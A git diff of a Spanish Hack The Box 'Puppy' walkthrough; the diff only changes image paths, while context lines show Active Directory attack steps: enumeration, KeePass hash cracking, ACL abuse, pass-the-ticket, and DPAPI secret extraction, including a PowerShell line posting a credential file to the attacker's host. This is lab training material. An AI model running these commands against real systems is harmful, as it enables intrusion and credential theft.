@@ -1,7 +1,7 @@
 
 ---
 
-![image](20250520144605.png)
+![image](../../../../../../../../KnowNotes/Imágenes/20250520144605.png)
 
 La máquina **Puppy** de Hack The Box simula un entorno corporativo realista, en el que el atacante comienza con un acceso inicial proporcionado por el cliente, representado por un par de credenciales válidas. Este escenario reproduce una situación común en pentests internos, donde se parte con acceso limitado a la red o a una cuenta de bajo privilegio.
 
@@ -26,7 +26,7 @@ Esta máquina permite practicar múltiples técnicas comunes en entornos Active 
 
 Ideal para quienes quieran reforzar su comprensión de técnicas post-explotación, manipulación de tickets Kerberos, gestión de credenciales en entornos Windows y el uso práctico de herramientas como BloodHound, John, `bloodyAD`, y DPAPI extraction.
 
-![image](20250520144757.png)
+![image](../../../../../../../../KnowNotes/Imágenes/20250520144757.png)
 
 # Enumeración Inicial
 
@@ -39,7 +39,7 @@ Partimos con las credenciales proporcionadas por el cliente para el usuario `lev
 sudo nmap -p- --open -sSCV -Pn 10.10.11.70
 ```
 
-![image](20250520152621.png)
+![image](../../../../../../../../KnowNotes/Imágenes/20250520152621.png)
 
 Nos acordamos de incluir `10.10.11.70    puppy.htb dc.puppy.htb` en el `/etc/hosts`
 ## Usuarios
@@ -48,7 +48,7 @@ Nos acordamos de incluir `10.10.11.70    puppy.htb dc.puppy.htb` en el `/etc/hos
 nxc smb puppy.htb -u levi.james -p 'KingofAkron2025!' --users
 ```
 
-![image](20250520152937.png)
+![image](../../../../../../../../KnowNotes/Imágenes/20250520152937.png)
 Nos creamos un listado de usuarios:
 
 ```Bash
@@ -61,7 +61,7 @@ enum4linux -U -u 'levi.james' -p 'KingofAkron2025!' puppy.htb | grep "user:" | c
 enum4linux -u 'levi.james' -p 'KingofAkron2025!' puppy.htb --pass-pol
 ```
 
-![image](20250520155209.png)
+![image](../../../../../../../../KnowNotes/Imágenes/20250520155209.png)
 
 ## Shares
 
@@ -69,7 +69,7 @@ enum4linux -u 'levi.james' -p 'KingofAkron2025!' puppy.htb --pass-pol
 smbmap -u 'levi.james' -p 'KingofAkron2025!' -H puppy.htb
 ```
 
-![image](20250520161058.png)
+![image](../../../../../../../../KnowNotes/Imágenes/20250520161058.png)
 Con este resultado y viendo que siendo del grupo `Developers` podríamos acceder a `DEV`, probamos suerte para ver si sería posible autoañadirnos:
 
 ```bash
@@ -78,7 +78,7 @@ net rpc group addmem "DEVELOPERS" "levi.james" -U "PUPPY.HTB"/"levi.james" -S "p
 
 Verificamos:
 
-![image](20250520161445.png)
+![image](../../../../../../../../KnowNotes/Imágenes/20250520161445.png)
 
 Visto que tenemos ahora acceso a  `dev`, veamos que hay dentro:
 
@@ -86,7 +86,7 @@ Visto que tenemos ahora acceso a  `dev`, veamos que hay dentro:
 smbclient -U 'levi.james' //10.10.11.70/dev
 ```
 
-![image](20250520161607.png)
+![image](../../../../../../../../KnowNotes/Imágenes/20250520161607.png)
 
 Como podemos observar, hay un archivo `.kdbx` que podemos descargarnos, sacar el hash y conseguir acceso realizando fuerza bruta con john.
 Para esta versión de archivo `kdbx`, es necesario descargar otro binario de john. [pincha aqui](git clone https://github.com/openwall/john.git)
@@ -94,14 +94,14 @@ Haciendo uso de este repositorio, primero necesitamos sacar el hash:
 ```bash
 keepass2john ~/htb/puppy/recovery.kdbx > ~/htb/puppy/hash_keepass
 ```
-![image](20250520162622.png)
+![image](../../../../../../../../KnowNotes/Imágenes/20250520162622.png)
 para despues crackearlo con la misma versión de john:
 
-![image](20250520162736.png)
+![image](../../../../../../../../KnowNotes/Imágenes/20250520162736.png)
 
 Acceso a keepass conseguido:
 
-![image](20250520162908.png)
+![image](../../../../../../../../KnowNotes/Imágenes/20250520162908.png)
 # Acceso
 
 Después de probar las diferentes opciones, solo las credenciales del usuario `Ant.edwards` son válidas.
@@ -113,7 +113,7 @@ bloodhound-python -u ant.edwards -p <ant.edward passwd> -ns 10.10.11.70 -d puppy
 
 Abriendo el archivo, podemos observar que el usuario `ant.edwards` es miembro del grupo `SENIOR DEVS`, el cual tiene el privilegio inseguro `GenericAll` habilitado. Permiso del que podemos aprovecharnos para conseguir las credenciales de `adam.silver`.
 
-![image](20250520163808.png)
+![image](../../../../../../../../KnowNotes/Imágenes/20250520163808.png)
 
 Para realizar el abuso de los ACL, nos automatizamos los pasos de forma que sea más rápida la adquisición del acceso por PtT (Pass the Ticket) y no caduque ningún paso anterior necesario.
 
@@ -138,13 +138,13 @@ evil-winrm -i dc.puppy.htb -u adam.silver -r PUPPY.HTB
 Para usar estos comandos y abusar de los ACL y conseguir el acceso, es necesario sincronizarse con el equipo remoto.
 Normalmente, con hacer `ntpdate -s <dominio>` sirve. Pero en mi caso necesito complicarlo un poco dada mi configuración de Arch.
 Creándome una función en el `.bashrc` tanto para sincronizar como para volver a nuestro estado original.
-![image](20250520165358.png)
+![image](../../../../../../../../KnowNotes/Imágenes/20250520165358.png)
 
-![image](20250520235429.png)
+![image](../../../../../../../../KnowNotes/Imágenes/20250520235429.png)
 
 Una vez sincronizados de forma exitosa, probamos el script anterior:
 
-![image](20250520235702.png)
+![image](../../../../../../../../KnowNotes/Imágenes/20250520235702.png)
 
 Y con esto, conseguimos con éxito la `user.txt` Pero no es el final aún....
 
@@ -153,16 +153,16 @@ Y con esto, conseguimos con éxito la `user.txt` Pero no es el final aún....
 
 Como usuario `adam.silver`, y despues de un rato enumerando, encontramos un `.zip` dentro de `C:\Backups`
 
-![image](20250521000621.png)
+![image](../../../../../../../../KnowNotes/Imágenes/20250521000621.png)
 
 nos lo descomprimimos, y después de un rato buscando, encontramos la passwd de `steph.cooper` en `C:\Backups\site-backup-2024-12-30\puppy\nms-auth-config.xml.bak`
 
-![image](20250521000920.png)
-![image](20250521001000.png)
+![image](../../../../../../../../KnowNotes/Imágenes/20250521000920.png)
+![image](../../../../../../../../KnowNotes/Imágenes/20250521001000.png)
 
 Pedimos el TGT para ralizar un PtT(Pass the Ticket) como usuario `steph.cooper`:
 
-![image](20250521001708.png)
+![image](../../../../../../../../KnowNotes/Imágenes/20250521001708.png)
 
 Después de un rato indagando dentro y visto el nombre de la máquina, llegAMOS a la conclusión de que necesitamos Abusar de DPAPI. [ver](https://www.thehacker.recipes/ad/movement/credentials/dumping/dpapi-protected-secrets#practice)
 
@@ -194,9 +194,9 @@ Invoke-WebRequest -Uri "http://10.10.16.48:8000/" -Method POST -InFile "C:\Users
 
 ```
 
-![image](20250521003239.png)
+![image](../../../../../../../../KnowNotes/Imágenes/20250521003239.png)
 
-![image](20250521003225.png)
+![image](../../../../../../../../KnowNotes/Imágenes/20250521003225.png)
 
 Ahora a sacar la información de dentro:
 
@@ -204,19 +204,19 @@ Ahora a sacar la información de dentro:
 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 -password '<steph.cooper pass>' -sid S-1-5-21-1487982659-1829050783-2281216199-1107
 ```
 
-![image](20250521003827.png)
+![image](../../../../../../../../KnowNotes/Imágenes/20250521003827.png)
 
 ```bash
 dpapi.py credential -f C8D69EBE9A43E9DEBF6B5FBD48B521B9 -key <decrypted key>
 ```
 
-![image](20250521003742.png)
+![image](../../../../../../../../KnowNotes/Imágenes/20250521003742.png)
 
 Consiguiendo así la passwd de `steph.cooper_adm`.
 
 Ahora, pedimos el TGT de `steph.cooper_adm`. y mediante un PtH accedemos y conseguimos la flag de administrador.
 
-![image](20250521004315.png)
+![image](../../../../../../../../KnowNotes/Imágenes/20250521004315.png)
 
 Cabe destacar que en un entorno real, se haría un dump de los secrets y sería de vital importancia conseguir persistencia.
 
